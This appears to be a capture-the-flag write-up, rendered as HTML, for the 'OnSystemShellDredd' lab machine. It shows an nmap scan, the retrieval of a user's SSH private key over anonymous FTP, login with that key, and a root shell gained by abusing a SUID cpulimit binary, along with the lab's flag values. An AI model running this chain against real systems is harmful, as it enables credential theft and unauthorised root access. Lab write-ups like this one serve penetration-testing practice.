@@ -1,0 +1,132 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>README.md</title>
+</head><body><br/>
+IP - 192.168.106.130<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+nmap result<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/OnSystemShellDredd]<br/>
+└─# nmap -sC -sV 192.168.106.130 -p- -oN nmap_all_port.txt<br/>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-28 17:30 +0630<br/>
+Stats: 0:02:49 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br/>
+SYN Stealth Scan Timing: About 61.97% done; ETC: 17:34 (0:01:43 remaining)<br/>
+Nmap scan report for 192.168.106.130<br/>
+Host is up (0.33s latency).<br/>
+Not shown: 65533 closed tcp ports (reset)<br/>
+PORT &nbsp; &nbsp; &nbsp;STATE SERVICE VERSION<br/>
+21/tcp &nbsp; &nbsp;open &nbsp;ftp &nbsp; &nbsp; vsftpd 3.0.3<br/>
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)<br/>
+| ftp-syst: <br/>
+| &nbsp; STAT: <br/>
+| FTP server status:<br/>
+| &nbsp; &nbsp; &nbsp;Connected to ::ffff:192.168.49.106<br/>
+| &nbsp; &nbsp; &nbsp;Logged in as ftp<br/>
+| &nbsp; &nbsp; &nbsp;TYPE: ASCII<br/>
+| &nbsp; &nbsp; &nbsp;No session bandwidth limit<br/>
+| &nbsp; &nbsp; &nbsp;Session timeout in seconds is 300<br/>
+| &nbsp; &nbsp; &nbsp;Control connection is plain text<br/>
+| &nbsp; &nbsp; &nbsp;Data connections will be plain text<br/>
+| &nbsp; &nbsp; &nbsp;At session startup, client count was 4<br/>
+| &nbsp; &nbsp; &nbsp;vsFTPd 3.0.3 - secure, fast, stable<br/>
+|_End of status<br/>
+61000/tcp open &nbsp;ssh &nbsp; &nbsp; OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br/>
+| ssh-hostkey: <br/>
+| &nbsp; 2048 592d210c2faf9d5a7b3ea427aa378908 (RSA)<br/>
+| &nbsp; 256 5926da443b97d230b19b9b02748b8758 (ECDSA)<br/>
+|_ &nbsp;256 8ead104fe33e652840cb5bbf1d247f17 (ED25519)<br/>
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br/>
+<br/>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br/>
+Nmap done: 1 IP address (1 host up) scanned in 306.90 seconds<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+User Access<br/>
+<br/>
+Got "hannah" id_rsa key from ftp server with anonymous login:<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# ftp 192.168.106.130<br/>
+Connected to 192.168.106.130.<br/>
+220 (vsFTPd 3.0.3)<br/>
+Name (192.168.106.130:root): anonymous<br/>
+331 Please specify the password.<br/>
+Password: <br/>
+230 Login successful.<br/>
+Remote system type is UNIX.<br/>
+Using binary mode to transfer files.<br/>
+ftp&gt; ls -la<br/>
+229 Entering Extended Passive Mode (|||61288|)<br/>
+150 Here comes the directory listing.<br/>
+drwxr-xr-x &nbsp; &nbsp;3 0 &nbsp; &nbsp; &nbsp; &nbsp;115 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;4096 Aug 06 &nbsp;2020 .<br/>
+drwxr-xr-x &nbsp; &nbsp;3 0 &nbsp; &nbsp; &nbsp; &nbsp;115 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;4096 Aug 06 &nbsp;2020 ..<br/>
+drwxr-xr-x &nbsp; &nbsp;2 0 &nbsp; &nbsp; &nbsp; &nbsp;0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;4096 Aug 06 &nbsp;2020 .hannah<br/>
+226 Directory send OK.<br/>
+ftp&gt; cd .hannah<br/>
+250 Directory successfully changed.<br/>
+ftp&gt; ls -la<br/>
+229 Entering Extended Passive Mode (|||5548|)<br/>
+150 Here comes the directory listing.<br/>
+drwxr-xr-x &nbsp; &nbsp;2 0 &nbsp; &nbsp; &nbsp; &nbsp;0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;4096 Aug 06 &nbsp;2020 .<br/>
+drwxr-xr-x &nbsp; &nbsp;3 0 &nbsp; &nbsp; &nbsp; &nbsp;115 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;4096 Aug 06 &nbsp;2020 ..<br/>
+-rwxr-xr-x &nbsp; &nbsp;1 0 &nbsp; &nbsp; &nbsp; &nbsp;0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;1823 Aug 06 &nbsp;2020 id_rsa<br/>
+226 Directory send OK.<br/>
+ftp&gt; get id_rsa<br/>
+local: id_rsa remote: id_rsa<br/>
+229 Entering Extended Passive Mode (|||31440|)<br/>
+150 Opening BINARY mode data connection for id_rsa (1823 bytes).<br/>
+100% |**************************************************************************************************| &nbsp;1823 &nbsp; &nbsp; &nbsp; &nbsp;2.49 MiB/s &nbsp; &nbsp;00:00 ETA<br/>
+226 Transfer complete.<br/>
+1823 bytes received in 00:00 (5.31 KiB/s)<br/>
+ftp&gt; exit<br/>
+<br/>
+<br/>
+Give permission 600 to id_rsa and connect ssh with username "hannah" and her id_rsa key:<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/OnSystemShellDredd]<br/>
+└─# ssh hannah@192.168.106.130 -i id_rsa -p 61000<br/>
+The authenticity of host '[192.168.106.130]:61000 ([192.168.106.130]:61000)' can't be established.<br/>
+ED25519 key fingerprint is SHA256:6tx3ODoidGvtQl+T9gJivu3xnndw7PXje1XLn+lZuSM.<br/>
+This key is not known by any other names<br/>
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br/>
+Warning: Permanently added '[192.168.106.130]:61000' (ED25519) to the list of known hosts.<br/>
+Linux ShellDredd 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64<br/>
+The programs included with the Debian GNU/Linux system are free software;<br/>
+the exact distribution terms for each program are described in the<br/>
+individual files in /usr/share/doc/*/copyright.<br/>
+<br/>
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br/>
+permitted by applicable law.<br/>
+hannah@ShellDredd:~$ whoami<br/>
+hannah<br/>
+<br/>
+Got 1st Flag<br/>
+<br/>
+hannah@ShellDredd:~$ cat local.txt <br/>
+9bfce65ee090ec44b33680748ef87bba<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Privilege Escalation (SUID /usr/bin/cpulimit)<br/>
+<br/>
+After running linpeas, I found /usr/bin/cpulimit and I can abusive this to get root shell:<br/>
+<br/>
+https://gtfobins.github.io/gtfobins/cpulimit/#suid<br/>
+<br/>
+hannah@ShellDredd:/tmp$ /usr/bin/cpulimit -l 100 -f -- /bin/sh -p <br/>
+Process 13255 detected<br/>
+# whoami<br/>
+root<br/>
+<br/>
+<br/>
+Final Flag<br/>
+<br/>
+# cat proof.txt<br/>
+4fa19c5f13eea2556a18423aabb7b419<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------</body></html>
